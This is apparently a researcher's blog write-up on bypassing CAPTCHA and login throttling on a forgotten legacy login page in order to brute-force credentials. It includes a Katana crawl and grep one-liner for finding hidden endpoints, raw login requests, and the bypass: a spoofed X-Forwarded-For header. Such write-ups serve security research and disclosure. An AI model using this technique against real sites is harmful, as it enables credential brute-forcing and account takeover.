---
title: "From Crawling To Old Unused Login Page To Stopping the Captcha Triggering"
date: 2026-06-08 00:00:00 +0000
categories: [Web, Bypass]
tags: [Captcha Triggering Bypass, Crawling]
image:
  path: ../assets/img/POST(5)/end.jpg
---

Hello Friend, Today I'm Going To Explain How I Bypassed Captcha Triggering Because the Help of Crawling That Made Me Able To Bruteforce Passwords and Usernames as Much as I Want .

* * *

in The First That Bypass Doesn't Happen in the Main Login Page Which was [https://www.example.com/credentials](https://www.example.com/credentials) Which _If You Sent Many Requests_ It Will **not Trigger Captcha But It will Give You 403 and Block you For ~2 Minutes.**

I Used Katana To Do the Crawling Job, To Get Me as Links as Possible With Analyzing the Javascript Files to Get More Endpoints

```shell
katana -u https://www.example.com/ --jc | tee katana.txt ; cat katana.txt | uro | sort -u > s.txt ; cat s.txt | grep -E '(api|rest|graphql|v[1-9]|internal|private|admin|debug|beta|mobile|app|txt|map|json|redirect)' > important_sorted_history.txt
```

Opened the File in Sublime and Hit Ctrl+F and Typed `login`

![](../assets/img/POST(5)/found.png)
*Found*

Login-Page: ![https://www.example.com/hab_usuarios/loginusuario.asp?p=E-X-X-X-X-X-X-X-X-X-X](https://www.example.com/hab_usuarios/loginusuario.asp?p=E-X-X-X-X-X-X-X-X-X-X)

![](../assets/img/POST(5)/new.png)
*Main Login Page*

![](../assets/img/POST(5)/old.png)
*Old and Forgotten Login Page (notUsed)*

* * *

## Difference Between Main and Old Login Pages :

### Main : 

```http
POST /security/api/auth/login HTTP/2
Host: api.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.56 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://www.redacted.com/
Content-Type: application/json
Content-Length: 71
Origin: https://www.example.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"
Sec-Ch-Ua-Mobile: ?0
Te: trailers

{"email":"attacker@example.com","password":"AAAAAAAAAAAAAAAAAAAA123a@"}
```

![](../assets/img/POST(5)/mainblocked.png)
*403 Forbidden*

### Old :

```http
POST /redacted_usuarios/ajax/login.asp HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.56 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://www.example.com/redacted_usuarios/loginusuario.asp?p=E-X-X-X-X-X-X-X-X-X-X
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 119
Origin: https://www.example.com
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"
sec-ch-ua-mobile: ?0
Priority: u=0

rol=particular&idioma=E&usuario=example%40example.com&password=AAAAAAAAAAAAAAAAAAAA123a%40&cookies=no&action=login
```

![](../assets/img/POST(5)/captcha.png)
*Captcha Triggered*

* * *

# Exploitation :

> if You Recognized, I Removed Any Cookies in the Requests Just to Avoid any Stuff That Will Make the Server Trigger the Captcha

I Tried a Bunch of Stuff Until One Something Successed Which is `X-Forwarded-For` Header With Any IP Value like 1.1.1.1, 192.168.1.1, 8.8.8.8, 127.0.0.1, anval ....

![](../assets/img/POST(5)/bypassed.png)
*Captcha Triggered*

Returning ID, and Cookies in the Header To the User Session. Which Completely Bypassed the Captcha Check That After Blocking !


I hope You Got any Useful idea from This Short Writeup .

Goodbye !